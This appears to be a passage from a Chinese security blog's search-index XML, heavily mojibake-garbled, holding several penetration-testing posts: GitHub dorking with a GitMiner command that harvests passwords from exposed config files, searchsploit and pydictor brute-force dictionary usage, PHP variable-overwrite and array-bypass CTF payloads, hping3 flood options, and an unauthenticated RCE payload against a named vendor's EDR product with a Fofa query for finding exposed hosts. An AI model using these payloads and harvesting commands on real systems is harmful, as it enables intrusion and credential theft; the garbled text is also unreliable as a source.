ç›¸å…³å·¥å…·https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md DNSå†å²è§£æè®°å½•â€¦ â€¦ Github Hackingå¯ä»¥æœç´¢ä»¥ä¸‹ç±»å‹çš„ä¿¡æ¯ï¼šRepositories,Topics,Issues and pull requests,Code,Commits,Users,Wikis æœç´¢ä»“åº“> exp stars:>1000 # åŒ¹é…å…³é”®å­—"exp"ä¸”starå¤§äº1000çš„ä»“åº“ >= exp topics:>=5 # åŒ¹é…å…³é”®å­—"exp"ä¸”æ ‡ç­¾æ•°é‡å¤§äºç­‰äº5çš„ä»“åº“ &lt; exp size:>=1000 # åŒ¹é…å…³é”®å­—"exp"ä¸”æ–‡ä»¶å¤§äº1KBçš„ä»“åº“ &lt;= n..* exp stars:1000..* # åŒ¹é…å…³é”®å­—"exp"ä¸”starå¤§äºç­‰äº1000çš„ä»“åº“ *..n exp stars:*..1000 # åŒ¹é…å…³é”®å­—"exp"ä¸”starå°äºç­‰äº1000çš„ä»“åº“ n..n exp stars:10..1000 # åŒ¹é…å…³é”®å­—"exp"ä¸”starå¤§äº10å¹¶å°äº1000çš„ä»“åº“ å…¶ä»–è¯­æ³•ç±»ä¼¼â€¦ â€¦ æœç´¢ä»£ç æ³¨æ„äº‹é¡¹ - åªèƒ½æœç´¢å°äº384 KBçš„æ–‡ä»¶ã€‚ - åªèƒ½æœç´¢å°‘äº500,000ä¸ªæ–‡ä»¶çš„å­˜å‚¨åº“ã€‚ - ç™»å½•çš„ç”¨æˆ·å¯ä»¥æœç´¢æ‰€æœ‰å…¬å…±å­˜å‚¨åº“ã€‚ - é™¤filename æœç´¢å¤–ï¼Œæœç´¢æºä»£ç æ—¶å¿…é¡»è‡³å°‘åŒ…å«-ä¸€ä¸ªæœç´¢è¯ã€‚ ä¾‹å¦‚ï¼Œæœç´¢language:javascriptæ— æ•ˆï¼Œè€Œæ˜¯è¿™æ ·: amazing language :javascriptã€‚ - æœç´¢ç»“æœæœ€å¤šå¯ä»¥æ˜¾ç¤ºæ¥è‡ªåŒä¸€æ–‡ä»¶çš„ä¸¤ä¸ªç‰‡æ®µï¼Œä½†æ–‡ä»¶ä¸­å¯èƒ½ä¼šæœ‰æ›´å¤šç»“æœã€‚ - æ‚¨ä¸èƒ½å°†ä»¥ä¸‹é€šé…ç¬¦ç”¨ä½œæœç´¢æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†:ï¼Œ ï¼Œ: ; /\'"=*!?#$&amp;+^|~&lt;>(){}[]ã€‚æœç´¢å°†å¿½ç•¥è¿™äº›ç¬¦å·ã€‚ æ—¥æœŸæ¡ä»¶ exp pushed:&lt;2020-08-08 # æœç´¢åœ¨2020å¹´8æœˆ8æ—¥å‰pushçš„ä»£ç ,å…³é”®å­—æ˜¯exp exp pushed:2020-05-05..2020-08-08 # æ—¥æœŸåŒºé—´ exp created:>=2020-08-08 # åˆ›å»ºæ—¶é—´ é€»è¾‘è¿ç®— AND OR NOT æ’é™¤è¿ç®— exp pushed:&lt;2020-08-08 -language:java # æœç´¢åœ¨2020å¹´8æœˆ8æ—¥å‰pushçš„ä»£ç ï¼Œå…³é”®å­—æ˜¯expï¼Œæ’é™¤javaè¯­è¨€çš„ä»“åº“ åŒ…å«æœç´¢ exp in:file # æœç´¢æ–‡ä»¶ä¸­åŒ…å«expçš„ä»£ç  exp in:path # æœç´¢è·¯å¾„ä¸­åŒ…å«expçš„ä»£ç  exp in:file,path # æœç´¢æ–‡ä»¶ã€è·¯å¾„ä¸­åŒ…å«expçš„ä»£ç  console path:app/public language:javascript # æœç´¢å…³é”®å­—console,è¯­è¨€ä¸ºjsï¼Œåœ¨app/publicä¸‹çš„ä»£ç  ä¸»ä½“æœç´¢ user:USERNAME # ç”¨æˆ·åæœç´¢ org:ORGNAME # ç»„ç»‡æœç´¢ repo:USERNAME/REPOSITORY # æŒ‡å®šä»“åº“æœç´¢ æ–‡ä»¶å¤§å° size:>1000 # æœç´¢å¤§äº1KBçš„æ–‡ä»¶ æ–‡ä»¶åç§° filename :config.php language:php # æœç´¢æ–‡ä»¶åä¸ºconfig.php,ä¸”è¯­è¨€ä¸ºphpçš„ä»£ç  # ä¾‹å¦‚æœç´¢Javaé¡¹ç›®é…ç½®æ–‡ä»¶: mail filename:.properties æ‹“å±•å extension:EXTENSION # æŒ‡å®šæ‰©å±•åæœç´¢ # ä¾‹å¦‚: extension:properties jdbc è‡ªåŠ¨åŒ–å·¥å…·https://github.com/UnkL4b/GitMiner # ç®€å•ç”¨æ³• # -r æ­£åˆ™ï¼Œ -q æŸ¥è¯¢å…³é”®å­— python3 gitminer-v2.0.py -C cookie.txt -q 'extension:properties jdbc' -r 'password(.*)' -m passwords document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æƒ…æŠ¥ä¿¡æ¯æœç´¢</tag>
        <tag>Githun Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¼€æ”¾æ¼æ´æƒ…æŠ¥]]></title>
    <url>%2Fposts%2F28882%2F</url>
    <content type="text"><![CDATA[å¸¸ç”¨ç½‘ç«™ CVE Exploit-DB CX Security CNVD Security tracker Search Exploit-DBkaliä¸­è‡ªå¸¦ searchsploit # æœç´¢Windowsææƒæ¼æ´ searchsploit -t windows local # æœç´¢Apacheæ¼æ´ searchsploit -t apache document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å¼€æ”¾æ¼æ´æƒ…æŠ¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å­—å…¸ç”Ÿæˆ-pydictor]]></title>
    <url>%2Fposts%2F31240%2F</url>
    <content type="text"><![CDATA[ä¸€ä¸ªå¼ºå¤§å®ç”¨çš„é»‘å®¢æš´åŠ›ç ´è§£å­—å…¸å»ºç«‹å·¥å…· åœ°å€ï¼šhttps://github.com/LandGrey/pydictor.git ç®€å•ç¤ºä¾‹ç”Ÿæˆå­—å…¸ python pydictor.py --sedb åˆå¹¶å»é‡ python pydictor.py -tool uniqbiner /my/all/dict/ å¤šå­—å…¸æ–‡ä»¶ç»„åˆå·¥å…· python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt ä½¿ç”¨pydictoræœ‰ä¸ªçªé—¨ï¼š æ—¶åˆ»æ¸…æ¥šä½ æƒ³è¦ä»€ä¹ˆæ ·å­çš„å­—å…¸. #### pydictorå¯ä»¥ç”Ÿæˆçš„æ‰€æœ‰å­—å…¸çš„ç±»å‹åŠå…¶è¯´æ˜ å½’å± ç±»åˆ« æ ‡è¯†ç¬¦ æè¿° æ”¯æŒåŠŸèƒ½ä»£å· core base C1 åŸºç¡€å­—å…¸ F1 F2 F3 F4 core char C2 è‡ªå®šä¹‰å­—ç¬¦é›†å­—å…¸ F1 F2 F3 F4 core chunk C3 æ’åˆ—ç»„åˆå­—å…¸ ALL core conf C4 é…ç½®è¯­æ³•ç”Ÿæˆå­—å…¸ ALL core extend C5 è§„åˆ™æ‰©å±•å­—å…¸ ALL core sedb C6 ç¤¾ä¼šå·¥ç¨‹å­¦å­—å…¸ ALL tool combiner T1 å­—å…¸åˆå¹¶å·¥å…· tool comparer T2 å­—å…¸æ¯”è¾ƒç›¸å‡å·¥å…· ALL tool counter T3 è¯é¢‘ç»Ÿè®¡å·¥å…· ALL tool handler T4 ç­›é€‰å¤„ç†åŸæœ‰å­—å…¸å·¥å…· ALL tool uniqbiner T5 å…ˆåˆå¹¶åå»é‡å·¥å…· ALL tool uniqifer T6 å­—å…¸å»é‡å·¥å…· ALL tool hybrider T7 å¤šå­—å…¸æ–‡ä»¶ç»„åˆå·¥å…· F1 F2 F3 F4 plugin birthday P1 ç”Ÿæ—¥æ—¥æœŸå­—å…¸æ’ä»¶ ALL plugin ftp P2 å…³é”®è¯ç”Ÿæˆftpå¯†ç å­—å…¸æ’ä»¶ ALL plugin pid4 P3 èº«ä»½è¯åå››ä½å­—å…¸æ’ä»¶ ALL plugin pid6 P4 èº«ä»½è¯åå…­ä½å­—å…¸æ’ä»¶ ALL plugin pid8 P5 èº«ä»½è¯åå…«ä½å­—å…¸æ’ä»¶ ALL plugin scratch P6 ç½‘é¡µåŸå§‹å…³é”®è¯å­—å…¸æ’ä»¶ ALL å­—å…¸æ“ä½œåŠŸèƒ½åŠè¯´æ˜å¯¹ç…§è¡¨ åŠŸèƒ½ åŠŸèƒ½ä»£å· è¯´æ˜ len F1 å®šä¹‰é•¿åº¦èŒƒå›´ head F2 æ·»åŠ å‰ç¼€ tail F3 æ·»åŠ åç¼€ encode F4 ç¼–ç æˆ–è‡ªå®šä¹‰åŠ å¯†æ–¹æ³• occur F5 å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦å‡ºç°æ¬¡æ•°èŒƒå›´ç­›é€‰ types F6 å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦å„ç§ç±»æ•°èŒƒå›´ç­›é€‰ regex F7 æ­£åˆ™ç­›é€‰ level F8 å­—å…¸çº§åˆ«ç­›é€‰ leet F9 1337 æ¨¡å¼ repeat F10 å­—æ¯ã€æ•°å­—ã€ç‰¹æ®Šå­—ç¬¦è¿ç»­å‡ºç°æ¬¡æ•°èŒƒå›´ç­›é€‰ æ”¯æŒçš„ç¼–ç æˆ–åŠ å¯†æ–¹å¼ æ–¹å¼ æè¿° none é»˜è®¤æ–¹å¼, ä¸è¿›è¡Œä»»ä½•ç¼–ç  b16 base16 ç¼–ç  b32 base32 ç¼–ç  b64 base64 ç¼–ç  des des ç®—æ³•, éœ€è¦æ ¹æ®æƒ…å†µä¿®æ”¹ä»£ç  execjs æ‰§è¡Œæœ¬åœ°æˆ–è¿œç¨‹jså‡½æ•°, éœ€è¦æ ¹æ®æƒ…å†µä¿®æ”¹ä»£ç  hmac hmac ç®—æ³•, éœ€è¦æ ¹æ®æƒ…å†µä¿®æ”¹ä»£ç  md5 md5 ç®—æ³•è¾“å‡º32ä½ md516 md5 ç®—æ³•è¾“å‡º16ä½ rsa rsa ç®—æ³• éœ€è¦æ ¹æ®æƒ…å†µä¿®æ”¹ä»£ç  sha1 sha-1 ç®—æ³• sha256 sha-256 ç®—æ³• sha512 sha-512 ç®—æ³• url url ç¼–ç  test ä¸€ä¸ªè‡ªå®šä¹‰ç¼–ç æ–¹æ³•çš„ç¤ºä¾‹ --encode b64 occur åŠŸèƒ½ç”¨æ³• : --occur [å­—æ¯å‡ºç°æ¬¡æ•°çš„èŒƒå›´] [æ•°å­—å‡ºç°æ¬¡æ•°çš„èŒƒå›´] [ç‰¹æ®Šå­—ç¬¦å‡ºç°æ¬¡æ•°çš„èŒƒå›´] ç¤ºä¾‹: --occur "&gt;=4" "&lt;6" "==0" types åŠŸèƒ½ç”¨æ³• : --types [å­—æ¯ç§ç±»çš„èŒƒå›´] [æ•°å­—ç§ç±»çš„èŒƒå›´] [ç‰¹æ®Šå­—ç¬¦ç§ç±»çš„èŒƒå›´] ç¤ºä¾‹: --types "&lt;=8" "&lt;=4" "=0" repeat åŠŸèƒ½ç”¨æ³• : --repeat [å­—æ¯è¿ç»­å‡ºç°æ¬¡æ•°èŒƒå›´] [æ•°å­—è¿ç»­å‡ºç°æ¬¡æ•°èŒƒå›´] [ç‰¹æ®Šå­—ç¬¦è¿ç»­å‡ºç°æ¬¡æ•°èŒƒå›´] ç¤ºä¾‹: --repeat "&lt;=3" "&gt;=3" "==0" regex åŠŸèƒ½ç”¨æ³• : --regex [æ­£åˆ™è¡¨è¾¾å¼] ç¤ºä¾‹: --regex "^z.*?g$" level åŠŸèƒ½ç”¨æ³• : --level [level] ç¤ºä¾‹: --level 4 /funcfg/extend.confé…ç½®æ–‡ä»¶ä¸­levelå¤§äºç­‰äº4çš„é¡¹ç›®ä¼šè¢«å¯ç”¨ leetåŠŸèƒ½é»˜è®¤ç½®æ¢è¡¨leetå­—ç¬¦ = æ›¿æ¢å­—ç¬¦ï¼Œå¯ä»¥ä¿®æ”¹/funcfg/leet_mode.confæ›´æ”¹æ›¿æ¢è¡¨ a = 4 b = 6 e = 3 l = 1 i = 1 o = 0 s = 5 æ¨¡å¼ä»£ç 0 é»˜è®¤æ¨¡å¼ï¼Œå…¨éƒ¨æ›¿æ¢ 1 ä»å·¦è‡³å³, å°†ç¬¬ä¸€ä¸ªé‡åˆ°çš„leetå­—ç¬¦å…¨éƒ¨æ›¿æ¢ 2 ä»å³è‡³å·¦, å°†ç¬¬ä¸€ä¸ªé‡åˆ°çš„leetå­—ç¬¦å…¨éƒ¨æ›¿æ¢ 11-19 ä»å·¦è‡³å³, å°†ç¬¬ä¸€ä¸ªé‡åˆ°çš„leetå­—ç¬¦æœ€å¤šæ›¿æ¢ code-10 ä¸ª 21-29 ä»å³è‡³å·¦, å°†ç¬¬ä¸€ä¸ªé‡åˆ°çš„leetå­—ç¬¦æœ€å¤šæ›¿æ¢ code-20 ä¸ª ä»£ç ä½œç”¨è¡¨ ä»£ç  åŸå­—ç¬¦ä¸² è¢«æ›¿æ¢åçš„æ–°å­—ç¬¦ä¸² 0 as a airs trees 45 4 41r5 tr335 1 as a airs trees 4s 4 4irs trees 2 as a airs trees a5 a air5 tree5 11 as a airs trees 4s a airs trees 12 as a airs trees 4s 4 airs trees 13 as a airs trees 4s 4 4irs trees 14 as a airs trees 4s 4 4irs trees â€¦ as a airs trees 4s 4 4irs trees 21 as a airs trees as a airs tree5 22 as a airs trees as a air5 tree5 23 as a airs trees a5 a air5 tree5 24 as a airs trees a5 a air5 tree5 â€¦ as a airs trees a5 a air5 tree5 å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1180351 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[phpå˜é‡è¦†ç›–]]></title>
    <url>%2Fposts%2F50639%2F</url>
    <content type="text"><![CDATA[å¯ä»¥ç”¨è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´ åœºæ™¯ $$ä½¿ç”¨ä¸å½“ extract()å‡½æ•°ä½¿ç”¨ä¸å½“ parse_str()å‡½æ•°ä½¿ç”¨ä¸å½“ import_request_variables()ä½¿ç”¨ä¸å½“ å¼€å¯äº†å…¨å±€å˜é‡æ³¨å†Œ â€¦ â€¦ 1. $$å¯¼è‡´çš„å˜é‡è¦†ç›– ç»å¸¸åœ¨foreachä¸­å‡ºç° ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ &lt;?php //?name=test //output:string(4) â€œnameâ€ string(4) â€œtestâ€ string(4) â€œtestâ€ test $name='thinking'; foreach ($_GET as $key => $value) $$key = $value; var_dump($key); var_dump($value); var_dump($$key); echo $name; ?> ä¾‹é¢˜ï¼š &lt;?php include "flag.php"; $_403 = "Access Denied"; $_200 = "Welcome Admin"; if ($_SERVER["REQUEST_METHOD"] != "POST") die("BugsBunnyCTF is here :pâ€¦"); if ( !isset($_POST["flag"]) ) die($_403); foreach ($_GET as $key => $value) key = value; foreach ($_POST as $key => $value) $$key = $value; if ( $_POST["flag"] !== $flag ) die($_403); echo "This is your flag : ". $flag . "\n"; die($_200); ?> 2. extract()å‡½æ•°å¯¼è‡´çš„å˜é‡è¦†ç›–extract() è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ è¯­æ³•ï¼š extract(array,extract_rules,prefix) extract æœ‰ä¸‰ç§å½¢å¼å¯èƒ½å¯¼è‡´å˜é‡è¦†ç›–: ç¬¬ä¸€ç§æ˜¯ç¬¬äºŒä¸ªå‚æ•°ä¸ºEXTR_OVERWRITE,ä»–è¡¨ç¤ºå¦‚æœæœ‰å†²çªï¼Œè¦†ç›–åŸæœ‰çš„å˜é‡ã€‚ ç¬¬äºŒç§æƒ…å†µæ˜¯åªä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé»˜è®¤ä¸ºEXTR_OVERWRITEæ¨¡å¼ã€‚ ç¬¬ä¸‰ç§æ˜¯ç¬¬äºŒä¸ªå‚æ•°ä¸ºEXTR_IF_EXISTSï¼Œä»–è¡¨ç¤ºåœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼,å…¶ä»–çš„éƒ½ä¸æ³¨å†Œæ–°å˜é‡. ä¾‹é¢˜1 &lt;?php $flag = 'xxx'; extract($_GET); if (isset($gift)) { $content = trim(file_get_contents($flag)); if ($gift == $content) { echo 'hctf{â€¦}'; } else { echo 'Oh..'; } } ?> //GETè¯·æ±‚ ?flag=&amp;gift=ï¼Œextract()ä¼šå°†$flagå’Œ$giftçš„å€¼è¦†ç›–äº†ï¼Œå°†å˜é‡çš„å€¼è®¾ç½®ä¸ºç©ºæˆ–è€…ä¸å­˜åœ¨çš„æ–‡ä»¶å°±æ»¡è¶³$gift == $contentã€‚ //payload: ?flag=&amp;gift= ä¾‹é¢˜2 &lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?> &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?> &lt;div class=â€alert alert-successâ€> &lt;code>&lt;?php echo $theflag; ?>&lt;/code> &lt;/div> &lt;?php } ?> &lt;?php } ?> //extract($_POST)ä¼šå°†POSTçš„æ•°æ®ä¸­çš„é”®åå’Œé”®å€¼è½¬æ¢ä¸ºç›¸åº”çš„å˜é‡åå’Œå˜é‡å€¼ï¼Œåˆ©ç”¨è¿™ä¸ªè¦†ç›–$passå’Œ$thepassword_123å˜é‡çš„å€¼ï¼Œä»è€Œæ»¡è¶³$pass == $thepassword_123è¿™ä¸ªæ¡ä»¶ã€‚ // POST Payload: //pass=&amp;thepassword_123= 3. parse_strå‡½æ•°å¯¼è‡´çš„å˜é‡è¦†ç›–parse_str() å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚æœæ²¡æœ‰array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ è¯­æ³•ï¼šparse_str(string,array) ä¾‹é¢˜1ï¼š &lt;?php error_reporting(0); if (empty($_GET['id'])) { show_source(__FILE__); die(); } else { include ('flag.php'); $a = "www.OPENCTF.com"; $id = $_GET['id']; @parse_str($id); if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) { echo $flag; } else { exit('å…¶å®å¾ˆç®€å•å…¶å®å¹¶ä¸éš¾ï¼'); } } ?> //0e123ä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•ï¼Œ0 * 10 x 123ã€‚æ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²md5åçš„ç»“æœæ˜¯0eå¼€å¤´åé¢éƒ½æ˜¯æ•°å­—çš„ï¼Œå¦‚ï¼Œ240610708ï¼Œs878926199a //åˆ©ç”¨phpå¼±è¯­è¨€ç‰¹æ€§, //ä½¿ç”¨GETè¯·æ±‚id=a[0]=240610708ï¼Œè¿™æ ·ä¼šå°†a[0]çš„å€¼è¦†ç›–ä¸º240610708ï¼Œç„¶åç»è¿‡md5åå¾—åˆ° 0e462097431906509019562988736854 ä¸md5(â€˜QNKCDZOâ€™)çš„ç»“æœ0e830400451993494058024219903391æ¯”è¾ƒéƒ½æ˜¯0 æ‰€ä»¥ç›¸ç­‰ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå¾—åˆ°flagã€‚ æœ€ç»ˆPAYLOADï¼š GET DATA: ?id=a[0]=s878926199a or ?id=a[0]=240610708 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å˜é‡è¦†ç›–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[issetæ•°ç»„ç»•è¿‡]]></title>
    <url>%2Fposts%2F57106%2F</url>
    <content type="text"><![CDATA[1.æ•°ç»„è¿”å›NULLç»•è¿‡&lt;?php $flag = "flag"; if (isset ($_GET['password'])) { if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) echo 'You password must be alphanumeric'; else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag); else echo 'Invalid password'; } ?> phpä¸èƒ½å¤„ç†æ•°ç»„ æ ¹æ® if (strpos ($_GET['password'], '--') !== FALSE) çŸ¥é“passwordä¸€å®šæœ‰'--'ã€‚å¼€å§‹æ„é€ %2dä½†æ˜¯è¿‡ä¸äº†ï¼Œæ ¹æ®é¢˜ç›®æš—ç¤ºå’Œphpç‰¹æ€§å¯ä»¥ä¼ ä¸€ä¸ªæ•°ç»„ç»•è¿‡åˆ¤æ–­ http://123.206.87.240:9009/19.php?password[]=sad%2d%2d strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ æ³¨é‡Šï¼šstrpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿã€‚ ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ 2.&lt;?php $flag = "flag"; if (isset ($_GET['ctf'])) { if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE) //â‘  echo 'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) //â‘¡ die('Flag: '.$flag); else echo 'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'; } ?> æ€è·¯ï¼š ereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²çš„ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULLï¼Œåˆ¤æ–­ç”¨çš„æ˜¯ === ï¼Œå…¶è¦æ±‚å€¼ä¸ç±»å‹éƒ½è¦ç›¸åŒï¼Œè€ŒNULLè·ŸFALSEç±»å‹æ˜¯ä¸åŒçš„,æ‰€ä»¥â‘ åˆ¤æ–­ifä¸æˆç«‹ï¼Œç»§ç»­æ‰§è¡Œâ‘¡ï¼Œè¿™æ—¶strposå‡½æ•°é‡åˆ°æ•°ç»„ï¼Œä¹Ÿè¿”å›NULLï¼Œä¸FALSEç±»å‹ä¸åŒï¼Œifæ¡ä»¶æˆç«‹ï¼Œè¾“å‡ºflagã€‚æ‰€ä»¥payloadåº”è¯¥æ˜¯?ctf[]=ä»»æ„å­—ç¬¦,ç”šè‡³å°±æ˜¯?ctf[]= document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>isset</tag>
        <tag>æ•°ç»„ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±Xæœ EDRç»ˆç«¯æ£€æµ‹ç³»ç»ŸRCEæ¼æ´å¤ç°]]></title>
    <url>%2Fposts%2F37031%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹æ·±ä¿¡æœç»ˆç«¯æ£€æµ‹å“åº”å¹³å°EDRï¼Œå›´ç»•ç»ˆç«¯èµ„äº§å®‰å…¨ç”Ÿå‘½å‘¨æœŸï¼Œé€šè¿‡é¢„é˜²ã€é˜²å¾¡ã€æ£€æµ‹ã€å“åº”èµ‹äºˆç»ˆç«¯æ›´ä¸ºç»†è‡´çš„éš”ç¦»ç­–ç•¥ã€æ›´ä¸ºç²¾å‡†çš„æŸ¥æ€èƒ½åŠ›ã€æ›´ä¸ºæŒç»­çš„æ£€æµ‹èƒ½åŠ›ã€æ›´ä¸ºå¿«é€Ÿçš„å¤„ç½®èƒ½åŠ›ã€‚åœ¨åº”å¯¹é«˜çº§å¨èƒçš„åŒæ—¶ï¼Œé€šè¿‡äº‘ç½‘ç«¯è”åŠ¨ååŒã€å¨èƒæƒ…æŠ¥å…±äº«ã€å¤šå±‚çº§å“åº”æœºåˆ¶ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿå¤„ç½®ç»ˆç«¯å®‰å…¨é—®é¢˜ï¼Œæ„å»ºè½»é‡çº§ã€æ™ºèƒ½åŒ–ã€å“åº”å¿«çš„ä¸‹ä¸€ä»£ç»ˆç«¯å®‰å…¨ç³»ç»Ÿã€‚ EDRçš„ç•Œé¢ RCE Payloadhttps://xxx.com:xxx/tool/log/c.php?strip_slashes=system&amp;host=id Fofaå…³é”®å­—title="ç»ˆç«¯æ£€æµ‹å“åº”å¹³å°" document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>æ·±ä¿¡æœ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hping3]]></title>
    <url>%2Fposts%2F18271%2F</url>
    <content type="text"><![CDATA[hping3ä¸»è¦æ˜¯æµ‹è¯•é˜²ç«å¢™çš„æ‹¦æˆªè§„åˆ™ï¼Œå¯¹ç½‘ç»œè®¾å¤‡è¿›è¡Œæµ‹è¯• ä¸»è¦åŠŸèƒ½ é˜²ç«å¢™æµ‹è¯•ï¼ˆå‚è€ƒï¼šhttp://0daysecurity.com/articles/hping3_examples.htmlï¼‰ ç«¯å£æ‰«æ Idleæ‰«æ æ‹’ç»æœåŠ¡æ”»å‡» æ–‡ä»¶ä¼ è¾“ æœ¨é©¬åŠŸèƒ½ â€¦â€¦ ä¸»è¦å‚æ•° -h --help æ˜¾ç¤ºå¸®åŠ© -v --version æ˜¾ç¤ºç‰ˆæœ¬ -c --count å‘é€æ•°æ®åŒ…çš„æ•°ç›® -i --interval å‘é€æ•°æ®åŒ…é—´éš”çš„æ—¶é—´ (uXå³Xå¾®ç§’, ä¾‹å¦‚ï¼š -i u1000) --fast ç­‰åŒ -i u10000 (æ¯ç§’10ä¸ªåŒ…) --faster ç­‰åŒ -i u1000 (æ¯ç§’100ä¸ªåŒ…) --flood å°½æœ€å¿«å‘é€æ•°æ®åŒ…ï¼Œä¸æ˜¾ç¤ºå›å¤ã€‚ -n --numeric æ•°å­—åŒ–è¾“å‡ºï¼Œè±¡å¾æ€§è¾“å‡ºä¸»æœºåœ°å€ã€‚ -q --quiet å®‰é™æ¨¡å¼ -I --interface ç½‘å¡æ¥å£ (é»˜è®¤è·¯ç”±æ¥å£) -V --verbose è¯¦ç»†æ¨¡å¼ -D --debug 